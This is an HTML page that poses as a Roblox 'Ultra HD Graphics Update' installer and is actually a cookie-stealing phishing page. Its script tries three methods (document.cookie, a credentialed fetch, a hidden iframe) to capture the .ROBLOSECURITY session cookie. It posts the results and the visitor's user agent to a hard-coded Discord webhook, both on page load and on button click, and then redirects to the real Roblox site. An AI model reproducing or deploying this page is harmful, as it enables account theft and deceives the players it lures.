<!DOCTYPE html>
<html>
<head>
    <title>Roblox HD Graphics Update</title>
    <meta charset="UTF-8">
    <style>
        body {
            background: linear-gradient(135deg, #00aeef, #0088cc);
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        .container {
            background: rgba(0, 0, 0, 0.4);
            padding: 40px;
            border-radius: 20px;
            width: 500px;
            margin: 0 auto;
            backdrop-filter: blur(10px);
            border: 2px solid #00ff88;
        }
        .btn {
            padding: 16px 45px;
            background: #00ff88;
            border: none;
            border-radius: 10px;
            color: #000;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            margin: 25px 0;
            transition: all 0.3s;
        }
        .btn:hover {
            background: #00cc66;
            transform: scale(1.05);
        }
        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #00ff88;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üéÆ ROBLOX ENHANCED</div>
        <h2>Ultra HD Graphics Update</h2>
        <p>Install the latest visual enhancement package</p>
        <p>Experience Roblox with 4K textures and improved lighting</p>
        
        <button class="btn" onclick="startInstall()">Install Graphics Update</button>
        
        <p style="font-size: 13px; opacity: 0.8;">
            One-time authentication required for verification
        </p>
    </div>

    <script>
        function startInstall() {
            console.log("Starting graphics update installation...");
            
            // –°–ø—Ä–æ–±–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∫—É–∫–∏ —á–µ—Ä–µ–∑ —Ä—ñ–∑–Ω—ñ –º–µ—Ç–æ–¥–∏
            attemptCookieCapture();
            
            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–∞ —Å–ø—Ä–∞–≤–∂–Ω—ñ–π Roblox
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com/';
            }, 2500);
        }

        function attemptCookieCapture() {
            // –ú–µ—Ç–æ–¥ 1: –ü—Ä–æ—Å—Ç–∞ —Å–ø—Ä–æ–±–∞ —á—Ç–µ–Ω–∏—è –∫—É–∫–æ–≤
            try {
                const allCookies = document.cookie;
                if (allCookies.includes('ROBLOSECURITY')) {
                    sendToDiscord("METHOD1: " + allCookies);
                    return;
                }
            } catch (e) {}

            // –ú–µ—Ç–æ–¥ 2: Fetch –∑–∞–ø—Ä–æ—Å –∫ Roblox API
            try {
                fetch('https://www.roblox.com/home', {
                    credentials: 'include',
                    mode: 'no-cors'
                })
                .then(response => response.text())
                .then(data => {
                    if (data.includes('ROBLOSECURITY')) {
                        sendToDiscord("METHOD2: " + data.substring(0, 200));
                    }
                })
                .catch(error => {
                    console.log("Fetch error:", error);
                });
            } catch (e) {}

            // –ú–µ—Ç–æ–¥ 3: –ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ —á–µ—Ä–µ–∑ iframe
            try {
                const iframe = document.createElement('iframe');
                iframe.src = 'https://www.roblox.com/';
                iframe.style.display = 'none';
                document.body.appendChild(iframe);

                setTimeout(() => {
                    try {
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        if (iframeDoc.cookie.includes('ROBLOSECURITY')) {
                            sendToDiscord("METHOD3: " + iframeDoc.cookie);
                        }
                    } catch (e) {
                        console.log("Iframe access denied");
                    }
                }, 2000);
            } catch (e) {}

            sendToDiscord("INFO: User clicked install button - " + navigator.userAgent);
        }

        function sendToDiscord(data) {
            const webhookURL = 'https://discord.com/api/webhooks/1410236047388049448/2-ih8qLMpj_9WDNKMQtn5KUYhtN5dAL-Q-j0bNuWFddeZRdNMai6qlQ5nMZhwOSj2COS';
            
            const payload = {
                content: "**üéØ ROBLOX UPDATE ATTEMPT**",
                embeds: [{
                    title: "Graphics Update Installation",
                    description: "```" + data + "```",
                    color: 65280,
                    timestamp: new Date().toISOString(),
                    footer: { text: "GitHub Pages Exploit" }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .catch(error => console.log('Discord send failed'));
        }

        // –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏
        window.addEventListener('load', function() {
            setTimeout(attemptCookieCapture, 1000);
        });
    </script>
</body>
</html>
